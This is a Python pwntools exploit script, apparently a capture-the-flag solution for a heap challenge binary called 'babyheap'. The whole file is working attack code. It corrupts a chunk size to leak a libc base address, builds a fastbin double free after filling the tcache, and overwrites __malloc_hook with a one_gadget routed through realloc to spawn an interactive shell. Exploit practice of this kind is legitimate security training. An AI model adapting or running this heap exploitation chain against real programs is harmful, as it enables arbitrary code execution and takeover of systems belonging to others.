#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')    

def cmd(x):
    r.recvuntil('Command: ')
    r.sendline(str(x))

def allocate(l):
    cmd(1)
    r.recvuntil('Size: ')
    r.sendline(str(l))

def fill(i,s,d):
    cmd(2)
    r.recvuntil('Index: ')
    r.sendline(str(i))
    r.recvuntil('Size: ')
    r.sendline(str(s))
    r.recvuntil('Content: ')
    r.send(d)

def free(i):
    cmd(3)
    r.recvuntil('Index: ')
    r.sendline(str(i))


def dump(i):
    cmd(4)
    r.recvuntil('Index: ')
    r.sendline(str(i))

allocate(0x68) # 0
allocate(0x68) # 1
allocate(0x68) # 2
allocate(0x188) # 3
allocate(0xf8) # 4
allocate(0xf8) # 5
allocate(0xf8) # 6
allocate(0x4f0) # 7
fill(0, 0x70, 'a'*0x68 + p64(0x501))
fill(6, 0x90, '\x00'*0x80 + p64(0x500) + p64(0x71))
free(1)

allocate(0x68) # 1
dump(2)
r.recvuntil('\n')
libc_base = u64(r.recv(8)) - 0x3ebca0
print '[+] libc_base : ', hex(libc_base)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
realloc = libc_base + libc.symbols['__libc_realloc']
print '[+] malloc_hook : ', hex(malloc_hook)
print '[+] realloc : ', hex(realloc)
one_gadget = libc_base + 0x10a38c 

allocate(0x68) # 8

for i in range(7): # tcache 
    allocate(0x68) # 9
    free(9)

allocate(0x68) # 9

free(2) # fastbin double free
free(9)
free(8)

allocate(0x68) # 2
fill(2, 0x10, p64(malloc_hook - 0x23) + p64(0))

allocate(0x68) # 8
allocate(0x68) # 9
allocate(0x68) # 10
fill(10, 0x13 + 8, 'a'*(0x13-8) + p64(one_gadget) + p64(realloc + 0xa))

cmd(1)
r.recvuntil('Size: ')
r.sendline('10')

r.interactive()
